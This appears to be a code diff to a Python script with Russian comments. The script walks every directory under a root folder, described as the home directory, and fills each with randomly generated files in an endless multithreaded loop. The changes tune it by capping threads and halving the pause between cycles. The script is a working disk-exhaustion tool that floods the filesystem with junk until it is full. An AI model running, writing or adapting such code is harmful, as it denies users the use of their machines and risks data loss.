@@ -6,8 +6,9 @@ import concurrent.futures
 import time
 
 def generate_random_data(size):
-    """Генерирует случайные данные для файла"""
+    """Генерирует случайные данные для файла более эффективно"""
     try:
+        # Генерируем строку разного размера с большим количеством данных для записи
         return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
     except Exception as e:
         print(f"Ошибка при генерации данных: {e}")
@@ -17,8 +18,12 @@ def generate_random_data(size):
 def create_large_file(file_path, file_size):
     """Создает файл заданного размера с рандомными данными и выводит путь к файлу"""
     try:
+        # Используем блоки данных для записи
+        data = generate_random_data(file_size)
+        
+        # Открываем файл и записываем данные за один раз
         with open(file_path, 'w') as f:
-            f.write(generate_random_data(file_size))
+            f.write(data)
         print(f"Файл создан: {file_path}")
     except Exception as e:
         print(f"Не удалось создать файл в {file_path}: {e}")
@@ -54,7 +59,7 @@ def create_files_in_directory(dirpath, file_size):
 def traverse_and_create_files(root_dir, file_size):
     """Обходит все директории в домашней директории и создает файлы размером file_size, используя многозадачность"""
     try:
-        with concurrent.futures.ThreadPoolExecutor() as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Уменьшаем количество параллельных потоков
             # Получаем список всех поддиректорий в корневой директории
             for dirpath, dirnames, filenames in os.walk(root_dir):
                 # Пропускаем системные директории или защищенные
@@ -76,7 +81,7 @@ def main():
         # Запускаем бесконечный цикл для непрерывного создания файлов
         while True:
             traverse_and_create_files(root_dir, file_size)
-            time.sleep(1)  # Задержка перед следующим циклом, чтобы избежать перегрузки
+            time.sleep(0.5)  # Уменьшаем задержку между циклами, чтобы избежать перегрузки
 
     except Exception as e:
         print(f"Ошибка в main: {e}")
